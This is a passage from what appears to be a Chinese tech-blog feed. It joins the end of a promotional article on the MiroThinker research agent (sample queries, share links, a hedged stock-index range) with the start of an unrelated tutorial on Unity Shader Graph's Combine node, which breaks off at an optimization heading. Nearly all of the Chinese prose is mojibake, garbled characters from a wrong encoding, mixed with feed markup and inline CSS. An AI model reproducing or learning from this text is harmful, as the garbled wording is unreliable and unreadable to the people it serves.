<pre><code class="hljs language-arduino" lang="arduino">ç»“æœåœ°å€ï¼šhttps:<span class="hljs-comment">//dr.miromind.ai/share/15ba9138-617f-4002-91a6-64a0a2e43c8a</span>
</code></pre>
<p>å»ºè®®çœ‹ä¸€ä¸‹è¿™ä¸ªè§†é¢‘ï¼Œçœ‹çœ‹ MiroThinker çš„åˆ†æç»“æœã€‚</p>
<p>ä½ ä¼šå‘ç°å®ƒä¸åƒæ˜¯ AI è¾“å‡ºçš„ï¼ŒçœŸçš„åƒä¸€ä¸ªèµ„æ·±ç ”ç©¶å‘˜å†™çš„ä¸œè¥¿ã€‚æ¯”å¦‚ç¬¬åç« å¯¹ 2026 å¹´çš„åˆ¤æ–­ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e79bb13ecfd54e499436c05c6eec7bdd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768543180&amp;x-signature=%2F1apRe%2FPTCzj2wfT8aPqZ%2BHY1gI%3D" alt="å›¾ç‰‡" loading="lazy"/>æœ‰ä¸€ä¸ªå¾ˆæœ‰æ„æ€çš„ç‚¹ï¼Œä½ æŠŠè¿™ä¸ªæç¤ºè¯ä¸¢è¿›å…¶å®ƒ Agent äº§å“é‡Œé¢ï¼Œå¾ˆå¤šç”Ÿæˆçš„æŠ¥å‘Šä¸­ï¼Œå›½å¤– AI å¤§æ¨¡å‹å‚å•†éƒ½æ²¡æœ‰æåˆ°Â <strong>Google Geminiã€‚</strong> <strong>ä½†æ˜¯ 2025 å¹´ Gemini 3 å’Œ Nano Banana ç­‰æ¨¡å‹ï¼Œè¶³å¤Ÿè®© Google è¿›å…¥ä¸–ç•Œ TOP 3 çš„è¡Œåˆ—äº†ã€‚</strong></p>
<p>case2ï¼šæœç´¢ Manus æ ¸å¿ƒæˆå‘˜çš„è®¿è°ˆè®°å½•ï¼Œè¯¦ç»†ä»‹ç»ä¸€ä¸‹æ¯ä¸€ä¸ªæ ¸å¿ƒæˆå‘˜è®¿è°ˆæ—¶èŠäº†å•¥ï¼Œé‡ç‚¹ä»‹ç»ä¸€ä¸‹ Manus çš„ç«‹é¡¹ã€è¯ç”Ÿå†ç¨‹ï¼Œä¸€å®šè¦è¯¦ç»†ã€‚</p>
<pre><code class="hljs language-arduino" lang="arduino">ç»“æœåœ°å€ï¼šhttps:<span class="hljs-comment">//dr.miromind.ai/share/a6a74739-d3e4-4f2f-9675-9ca51e1326e4</span>
</code></pre>
<p>æœ€è¿‘æŠŠ Manus ç›¸å…³çš„è®¿è°ˆå¬äº†ä¸€ä¸ªéï¼ŒMiroThinker ç»™çš„ç»“æœéå¸¸æƒŠè‰³ã€éå¸¸æƒŠè‰³ï¼Œæ ¸å¿ƒé‡ç‚¹éƒ½è¦†ç›–åˆ°äº†ã€‚</p>
<p>case3ï¼šè¯·ä½ æœç´¢åŒ—äº¬çš„æ˜æ˜Ÿ AI åˆåˆ›å…¬å¸ï¼Œä»‹ç»ä¸€ä¸‹å…¬å¸åç§°ã€å…·ä½“ä¸šåŠ¡ã€èèµ„ä¿¡æ¯ã€äº§å“ä¿¡æ¯ã€èµ›é“ç­‰ç­‰ã€‚</p>
<pre><code class="hljs language-arduino" lang="arduino">ç”Ÿæˆåœ°å€ï¼šhttps:<span class="hljs-comment">//dr.miromind.ai/share/7033378d-50e5-47d6-a082-760cffb0f5f3</span>
</code></pre>
<p>case4ï¼šA è‚¡ä¼šåœ¨æ˜¥èŠ‚å‰æ¶¨åˆ°å¤šå°‘ï¼Ÿ</p>
<pre><code class="hljs language-arduino" lang="arduino">ç”Ÿæˆåœ°å€ï¼šhttps:<span class="hljs-comment">//dr.miromind.ai/share/e12611c9-bcde-475b-a153-4d9aaef92fe6</span>
</code></pre>
<p>ç®€çŸ­æ€»ç»“ä¸€å¥è¯ç‰ˆï¼š</p>
<p>åœ¨ç›®å‰ 4080 ç‚¹é™„è¿‘å¼ºåŠ¿ä½ç½®ä¸Šï¼Œç»“åˆè¿‡å» 20 å¹´æ•°æ®å’Œä»Šå¹´æ”¿ç­–ç¯å¢ƒï¼Œæ›´å¤§æ¦‚ç‡æ˜¯æ˜¥èŠ‚å‰å›´ç»•ç°åœ¨ç‚¹ä½ä¸Šä¸‹è‹¥å¹²ç™¾åˆ†ç‚¹çš„éœ‡è¡åå¼ºï¼Œå†å²ç»Ÿè®¡å¯¹åº”çš„å¤§è‡´åŒºé—´å¤§çº¦åœ¨ 4 000â€“4 200 ç‚¹ä¸€å¸¦ï¼Œä½†è¿™ä¸æ˜¯é¢„æµ‹ï¼Œå®é™…å¯èƒ½å› çªå‘å› ç´ å¤§å¹…åç¦»ã€‚</p>
<p>å¾ˆæœ‰æ„æ€ï¼ŒMiroThinkerÂ ä¸»å¼ æ”¾å¼ƒå¯¹å…·ä½“ç‚¹ä½çš„ç²¾å‡†é¢„æµ‹ã€‚</p>
<p>é€šè¿‡å åŠ å†å²ã€Œæ˜¥èŠ‚æ•ˆåº”ã€ç»Ÿè®¡æ•°æ®ä¸å½“å‰å¼ºåŠ²çš„æ”¿ç­–åŠè¡Œæƒ…è¶‹åŠ¿ï¼Œæ„å»ºä¸€ä¸ªåŸºäºæ¦‚ç‡çš„åˆç†æ³¢åŠ¨åŒºé—´ï¼ˆè€Œéç¡®å®šæ•°å€¼ï¼‰ä½œä¸ºæŠ•èµ„å†³ç­–çš„å‚è€ƒã€‚</p>
<h2 data-id="heading-2">02ã€æ€ä¹ˆä½¿ç”¨</h2>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2025434b1b774baf80b4cb1350aba716~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768543180&amp;x-signature=QNAe3Q7V0ji%2BWlHjzMSPcB46lUs%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<pre><code class="hljs language-bash" lang="bash">ä½“éªŒåœ°å€ï¼šhttps://dr.miromind.ai/å¼€æºåœ°å€ï¼šhttps://github.com/MiroMindAI/MiroThinkeræ¨¡å‹ä¸‹è½½ï¼šhttps://huggingface.co/miromind-ai/MiroThinker-v1.5-235B
</code></pre>
<p>ç°åœ¨ AI å¤§æ¨¡å‹éƒ½åœ¨ç–¯ç‹‚å†…å·å‚æ•°è§„æ¨¡ï¼Œè¯•å›¾æƒ³æŠŠå…¨ä¸–ç•ŒçŸ¥è¯†èƒŒè¿›æ¨¡å‹é‡Œé¢ã€‚å•çº¯å †ç Œå†…éƒ¨å‚æ•°çš„ Scaling Law å¯èƒ½å·²è§¦åŠå¤©èŠ±æ¿ã€‚</p>
<p>MiroThinker è®©æˆ‘ä»¬çœ‹åˆ°ä¸€ä¸ªæ–°çš„è·¯çº¿ï¼Œå¯èƒ½çœŸæ­£çš„é€šç”¨äººå·¥æ™ºèƒ½ï¼ˆAGIï¼‰ä¸åº”æ˜¯æ­»è®°ç¡¬èƒŒçš„åšé¢˜å®¶ï¼Œè€Œåº”æ˜¯å…·å¤‡å‘ç°å¼æ™ºèƒ½çš„ç§‘å­¦å®¶ã€‚</p>
<p>æ›´å¤šè¯¦ç»†è§†é¢‘æ¡ˆä¾‹ä»‹ç»ï¼Œè¯·æŸ¥çœ‹åŸæ–‡ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FFEJtibpzlG3_pUKMHR0NiA" target="_blank" title="https://mp.weixin.qq.com/s/FEJtibpzlG3_pUKMHR0NiA" ref="nofollow noopener noreferrer">mp.weixin.qq.com/s/FEJtibpzlâ€¦</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ã€èŠ‚ç‚¹ã€‘[Channel-CombineèŠ‚ç‚¹]åŸç†è§£æä¸å®é™…åº”ç”¨]]></title>    <link>https://juejin.cn/post/7592996072705572914</link>    <guid>https://juejin.cn/post/7592996072705572914</guid>    <pubDate>2026-01-09T06:03:11.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592996072705572914" data-draft-id="7592992745573564454" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ã€èŠ‚ç‚¹ã€‘[Channel-CombineèŠ‚ç‚¹]åŸç†è§£æä¸å®é™…åº”ç”¨"/> <meta itemprop="keywords" content="æ¸¸æˆå¼€å‘,å›¾å½¢å­¦,Unity3D"/> <meta itemprop="datePublished" content="2026-01-09T06:03:11.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="SmalBox"/> <meta itemprop="url" content="https://juejin.cn/user/2218166695237532"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ã€èŠ‚ç‚¹ã€‘[Channel-CombineèŠ‚ç‚¹]åŸç†è§£æä¸å®é™…åº”ç”¨
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2218166695237532/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    SmalBox
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-09T06:03:11.000Z" title="Fri Jan 09 2026 06:03:11 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»8åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.csdn.net%2Fchenghai37%2Fcategory_13074589.html%3Ffromshare%3Dblogcolumn%26sharetype%3Dblogcolumn%26sharerId%3D13074589%26sharerefer%3DPC%26sharesource%3Dchenghai37%26sharefrom%3Dfrom_link" target="_blank" title="https://blog.csdn.net/chenghai37/category_13074589.html?fromshare=blogcolumn&amp;sharetype=blogcolumn&amp;sharerId=13074589&amp;sharerefer=PC&amp;sharesource=chenghai37&amp;sharefrom=from_link" ref="nofollow noopener noreferrer">ã€Unity Shader Graph ä½¿ç”¨ä¸ç‰¹æ•ˆå®ç°ã€‘</a><strong>ä¸“æ -ç›´è¾¾</strong></p>
</blockquote>
<p>åœ¨Unity URPï¼ˆé€šç”¨æ¸²æŸ“ç®¡çº¿ï¼‰çš„ShaderGraphä¸­ï¼ŒCombineèŠ‚ç‚¹ä½œä¸ºåŸºç¡€å´ä¸å¯æˆ–ç¼ºçš„å·¥å…·ï¼Œä¸»è¦ç”¨äºå°†ç‹¬ç«‹çš„æµ®ç‚¹æ•°å€¼ç»„åˆæˆå‘é‡ï¼Œå¹¿æ³›åº”ç”¨äºæè´¨ç¼–è¾‘ã€æ•°æ®æ•´åˆå’Œç®—æ³•é€»è¾‘ä¸­ã€‚æœ¬æ–‡å°†ç³»ç»Ÿè§£æCombineèŠ‚ç‚¹çš„åŠŸèƒ½ç‰¹æ€§ã€ç«¯å£å‚æ•°ã€å®é™…åº”ç”¨åœºæ™¯ã€æ€§èƒ½å½±å“åŠå…·ä½“ç¤ºä¾‹ï¼Œå¸®åŠ©å¼€å‘è€…æ·±å…¥ç†è§£å¹¶é«˜æ•ˆè¿ç”¨è¯¥èŠ‚ç‚¹ã€‚é€šè¿‡å…¨é¢å­¦ä¹ ï¼Œè¯»è€…å°†èƒ½å¤Ÿä¼˜åŒ–ç€è‰²å™¨è®¾è®¡ï¼Œæå‡è§†è§‰æ•ˆæœä¸æ¸²æŸ“æ•ˆç‡ã€‚</p>
<h3 data-id="heading-0">èŠ‚ç‚¹åŠŸèƒ½æ¦‚è¿°</h3>
<p>CombineèŠ‚ç‚¹æ˜¯ShaderGraphä¸­ç”¨äºå°†å¤šä¸ªæµ®ç‚¹è¾“å…¥ç»„åˆæˆå‘é‡çš„æ ¸å¿ƒç»„ä»¶ã€‚å®ƒé€šè¿‡åˆå¹¶Rã€Gã€Bã€Aå››ä¸ªé€šé“çš„æµ®ç‚¹å€¼ï¼Œè¾“å‡ºVector2ã€Vector3æˆ–Vector4ç­‰ä¸åŒç»´åº¦çš„å‘é‡ã€‚è¯¥èŠ‚ç‚¹çš„ä¼˜åŠ¿åœ¨äºæ“ä½œçµæ´»ã€é€»è¾‘ç›´è§‚ï¼Œèƒ½å¤Ÿæœ‰æ•ˆç®€åŒ–å‘é‡æ„å»ºè¿‡ç¨‹ï¼Œé™ä½ä»£ç å¤æ‚åº¦ã€‚ä¾‹å¦‚ï¼Œåœ¨è‡ªå®šä¹‰æè´¨å¼€å‘ä¸­ï¼Œå¼€å‘è€…å¯ä¾¿æ·åœ°å°†é¢œè‰²ã€é€æ˜åº¦æˆ–çº¹ç†åæ ‡ç­‰æ•°æ®æ•´åˆä¸ºç»Ÿä¸€å‘é‡ï¼Œæ— éœ€æ‰‹åŠ¨ç¼–å†™å¤æ‚è„šæœ¬ã€‚æ­¤å¤–ï¼ŒCombineèŠ‚ç‚¹æ”¯æŒè¿è¡Œæ—¶åŠ¨æ€è°ƒæ•´è¾“å…¥å‚æ•°ï¼Œä¾¿äºå®ç°äº¤äº’å¼æ•ˆæœï¼Œå¦‚åŠ¨æ€è‰²å½©æ··åˆæˆ–å®æ—¶åŠ¨ç”»ã€‚</p>
<h3 data-id="heading-1">ç«¯å£ä¸å‚æ•°è¯¦è§£</h3>
<h4 data-id="heading-2">è¾“å…¥ç«¯å£</h4>
<p>CombineèŠ‚ç‚¹æä¾›å››ä¸ªè¾“å…¥ç«¯å£ï¼Œåˆ†åˆ«å¯¹åº”Rï¼ˆçº¢ï¼‰ã€Gï¼ˆç»¿ï¼‰ã€Bï¼ˆè“ï¼‰å’ŒAï¼ˆé€æ˜åº¦ï¼‰é€šé“ã€‚æ¯ä¸ªç«¯å£æ¥å—ä¸€ä¸ªæµ®ç‚¹å€¼ï¼Œå–å€¼èŒƒå›´é€šå¸¸ä¸º[0,1]ã€‚è¾“å…¥æºå¯æ¥è‡ªColorèŠ‚ç‚¹ã€FloatèŠ‚ç‚¹æˆ–æ•°å­¦è¿ç®—èŠ‚ç‚¹ç­‰ã€‚éœ€æ³¨æ„çš„æ˜¯ï¼Œè¾“å…¥å€¼ä¸ä»…é™äºé¢œè‰²æ•°æ®ï¼Œä¹Ÿå¯ä»¥æ˜¯å…‰ç…§å¼ºåº¦ã€çº¹ç†åç§»æˆ–æ—¶é—´å˜é‡ç­‰ä»»æ„æµ®ç‚¹æ•°ã€‚é€šè¿‡çµæ´»é…ç½®è¿™äº›ç«¯å£ï¼Œå¼€å‘è€…èƒ½å¤Ÿæ„å»ºå¤šç»´å‘é‡ä»¥æ»¡è¶³å¤šæ ·åŒ–æ¸²æŸ“éœ€æ±‚ã€‚ä¾‹å¦‚ï¼Œæ¨¡æ‹Ÿæ°´é¢åå°„æ—¶ï¼Œå¯å°†æ³¢æµªé«˜åº¦ä¸æ–¹å‘å‚æ•°åˆ†åˆ«è¾“å…¥Rå’ŒGç«¯å£ï¼Œç”ŸæˆVector2ç”¨äºæ³•çº¿è®¡ç®—ã€‚</p>
<h4 data-id="heading-3">è¾“å‡ºç«¯å£</h4>
<p>è¾“å‡ºç«¯å£æ ¹æ®å·²è¿æ¥çš„è¾“å…¥æ•°é‡ç”Ÿæˆå¯¹åº”ç»´åº¦çš„å‘é‡ï¼šä»…è¿æ¥Rå’ŒGæ—¶è¾“å‡ºVector2ï¼›è¿æ¥Rã€Gã€Bæ—¶è¾“å‡ºVector3ï¼›å…¨éƒ¨è¿æ¥åˆ™è¾“å‡ºVector4ã€‚è¾“å‡ºå‘é‡å¯ç›´æ¥ç”¨äºåç»­èŠ‚ç‚¹å¤„ç†ï¼Œå¦‚å…‰ç…§æ¨¡å‹ã€çº¹ç†é‡‡æ ·æˆ–æ··åˆæ“ä½œã€‚åœ¨å®é™…åº”ç”¨ä¸­ï¼Œè¾“å‡ºå‘é‡çš„ç»´åº¦éœ€æ ¹æ®åœºæ™¯éœ€æ±‚é€‰æ‹©â€”â€”Vector2é€‚ç”¨äºUVåæ ‡å¤„ç†ï¼ŒVector3å¸¸ç”¨äºé¢œè‰²æˆ–ä½ç½®æ•°æ®ï¼ŒVector4åˆ™æ”¯æŒå«é€æ˜åº¦çš„å®Œæ•´è‰²å½©è¡¨è¾¾ã€‚åˆç†é€‰æ‹©ç»´åº¦æœ‰åŠ©äºå¹³è¡¡åŠŸèƒ½å®Œæ•´æ€§ä¸æ¸²æŸ“æ€§èƒ½ã€‚</p>
<h2 data-id="heading-4">ç«¯å£</h2>





























































<table><thead><tr><th>åç§°</th><th>æ–¹å‘</th><th>ç±»å‹</th><th>ç»‘å®š</th><th>æè¿°</th></tr></thead><tbody><tr><td>R</td><td>è¾“å…¥</td><td>Float</td><td>æ— </td><td>å®šä¹‰è¾“å‡ºçš„çº¢è‰²é€šé“</td></tr><tr><td>G</td><td>è¾“å…¥</td><td>Float</td><td>æ— </td><td>å®šä¹‰è¾“å‡ºçš„ç»¿è‰²é€šé“</td></tr><tr><td>B</td><td>è¾“å…¥</td><td>Float</td><td>æ— </td><td>å®šä¹‰è¾“å‡ºçš„è“è‰²é€šé“</td></tr><tr><td>A</td><td>è¾“å…¥</td><td>Float</td><td>æ— </td><td>å®šä¹‰è¾“å‡ºçš„ Alpha é€šé“</td></tr><tr><td>RGBA</td><td>è¾“å‡º</td><td>Vector 4</td><td>æ— </td><td>è¾“å‡ºå€¼ï¼ˆ<strong>Vector 4</strong>ï¼‰</td></tr><tr><td>RGB</td><td>è¾“å‡º</td><td>Vector 3</td><td>æ— </td><td>è¾“å‡ºå€¼ï¼ˆ<strong>Vector 3</strong>ï¼‰</td></tr><tr><td>RG</td><td>è¾“å‡º</td><td>Vector 2</td><td>æ— </td><td>è¾“å‡ºå€¼ï¼ˆ<strong>Vector 2</strong>ï¼‰</td></tr></tbody></table>
<h3 data-id="heading-5">ç”Ÿæˆçš„ä»£ç ç¤ºä¾‹</h3>
<p>ä»¥ä¸‹ç¤ºä¾‹ä»£ç è¡¨ç¤ºæ­¤èŠ‚ç‚¹çš„ä¸€ç§å¯èƒ½ç»“æœã€‚</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">Unity_Combine_float</span>(<span class="hljs-params"><span class="hljs-built_in">float</span> R, <span class="hljs-built_in">float</span> G, <span class="hljs-built_in">float</span> B, <span class="hljs-built_in">float</span> A, <span class="hljs-keyword">out</span> float4 RGBA, <span class="hljs-keyword">out</span> float3 RGB, <span class="hljs-keyword">out</span> float2 RG</span>)</span>
{
    RGBA = float4(R, G, B, A);
    RGB = float3(R, G, B);
    RG = float2(R, G);
}
</code></pre>
<h3 data-id="heading-6">åº”ç”¨åœºæ™¯</h3>
<h4 data-id="heading-7">æè´¨ç¼–è¾‘</h4>
<p>åœ¨æè´¨ç¼–è¾‘ä¸­ï¼ŒCombineèŠ‚ç‚¹å¸¸ç”¨äºæ•´åˆé¢œè‰²ã€é€æ˜åº¦æˆ–çº¹ç†åæ ‡ç­‰å‚æ•°ã€‚ä¾‹å¦‚ï¼Œå°†åŸºç¡€é¢œè‰²ä¸æ³•çº¿è´´å›¾å¼ºåº¦å€¼ç»„åˆï¼Œå¯æ„å»ºå¤æ‚æè´¨æ•ˆæœã€‚åœ¨PBRï¼ˆåŸºäºç‰©ç†çš„æ¸²æŸ“ï¼‰æè´¨ä¸­ï¼Œé€šè¿‡å°†é‡‘å±åº¦ã€ç²—ç³™åº¦åŠç¯å¢ƒå…‰é®è”½å€¼è¾“å…¥CombineèŠ‚ç‚¹ï¼Œç”ŸæˆVector3ç”¨äºå…‰ç…§è®¡ç®—ï¼Œæ—¢ç®€åŒ–èŠ‚ç‚¹ç½‘ç»œï¼Œåˆå¢å¼ºæè´¨å¯è°ƒèŠ‚æ€§ã€‚æ­¤å¤–ï¼Œç»“åˆæ—¶é—´å˜é‡ä¸é¢œè‰²å€¼ï¼Œå¯å®ç°åŠ¨æ€æ•ˆæœå¦‚é—ªçƒæˆ–æ¸å˜ï¼Œæå‡è§†è§‰è¡¨ç°åŠ›ã€‚</p>
<h4 data-id="heading-8">æ•°æ®æ•´åˆ</h4>
<p>CombineèŠ‚ç‚¹èƒ½å¤Ÿå°†åˆ†æ•£çš„æ•°å€¼ç»Ÿä¸€ä¸ºå‘é‡ï¼Œç®€åŒ–å¤šé€šé“æ•°æ®å¤„ç†ã€‚ä¾‹å¦‚ï¼Œåœ¨è‡ªå®šä¹‰å…‰ç…§æ¨¡å‹ä¸­ï¼Œå°†æ¼«åå°„å¼ºåº¦ã€é«˜å…‰å¼ºåº¦åŠé˜´å½±å‚æ•°åˆå¹¶ä¸ºVector3ï¼Œä¼ é€’ç»™å…‰ç…§å‡½æ•°ï¼Œé™ä½èŠ‚ç‚¹è¿æ¥å¤æ‚åº¦ï¼Œæé«˜ç€è‰²å™¨å¯è¯»æ€§ã€‚åœ¨ç²’å­ç³»ç»Ÿä¸­ï¼Œè¯¥èŠ‚ç‚¹è¿˜å¯ç”¨äºæ•´åˆé€Ÿåº¦ã€å¤§å°ä¸ç”Ÿå‘½å‘¨æœŸå‚æ•°ï¼Œç”Ÿæˆæ§åˆ¶ç²’å­è¡Œä¸ºçš„å‘é‡ã€‚</p>
<h4 data-id="heading-9">ç®—æ³•é€»è¾‘</h4>
<p>åœ¨ç®—æ³•è®¾è®¡ä¸­ï¼ŒCombineèŠ‚ç‚¹ç”¨äºç”Ÿæˆæ”¯æŒå‘é‡è¿ç®—çš„æ•°æ®ç»“æ„ã€‚ä¾‹å¦‚ï¼Œå®ç°æ‰­æ›²æ•ˆæœæ—¶ï¼Œå°†ä½ç§»é‡ä¸é¢œè‰²å€¼ç»„åˆä¸ºVector2ï¼Œç”¨äºUVåç§»è®¡ç®—ã€‚åœ¨æ¨¡æ‹Ÿè‡ªç„¶ç°è±¡ï¼ˆå¦‚å¤©æ°”ç³»ç»Ÿï¼‰æ—¶ï¼Œå¯å°†é£é€Ÿã€æ¹¿åº¦ä¸æ¸©åº¦å‚æ•°åˆå¹¶ä¸ºVector3ï¼Œé©±åŠ¨å®æ—¶ç€è‰²å™¨ã€‚æ¸¸æˆä¸­çš„äº¤äº’åé¦ˆä¹Ÿå¯åˆ©ç”¨æ­¤èŠ‚ç‚¹ï¼Œå¦‚ç»„åˆç©å®¶è¾“å…¥çš„ä½ç½®ä¸å¼ºåº¦å€¼ç”ŸæˆVector2ï¼Œç”¨äºè§¦æ§å“åº”ã€‚</p>
<h3 data-id="heading-10">æ€§èƒ½å½±å“</h3>
<h4 data-id="heading-11">è®¡ç®—å¼€é”€</h4>
<p>CombineèŠ‚ç‚¹æœ¬èº«è®¡ç®—å¼€é”€è¾ƒä½ï¼Œä»…æ¶‰åŠç®€å•çš„å‘é‡ç»„è£…æ“ä½œã€‚ç„¶è€Œï¼Œåœ¨å¤æ‚æè´¨ä¸­é¢‘ç¹è°ƒç”¨è¯¥èŠ‚ç‚¹å¯èƒ½ç´¯ç§¯å¢åŠ GPUè´Ÿæ‹…ï¼Œå½±å“å®æ—¶æ¸²æŸ“å¸§ç‡ã€‚æµ‹è¯•æ˜¾ç¤ºï¼Œåœ¨ç§»åŠ¨è®¾å¤‡ä¸Šè¿‡åº¦ä½¿ç”¨CombineèŠ‚ç‚¹å¯èƒ½å¯¼è‡´æ¸²æŸ“æ—¶é—´ä¸Šå‡5-10%ï¼Œå°¤å…¶åœ¨å¤„ç†é«˜åˆ†è¾¨ç‡çº¹ç†æ—¶æ›´ä¸ºæ˜æ˜¾ã€‚</p>
<h4 data-id="heading-12">ä¼˜åŒ–å»ºè®®</h4>
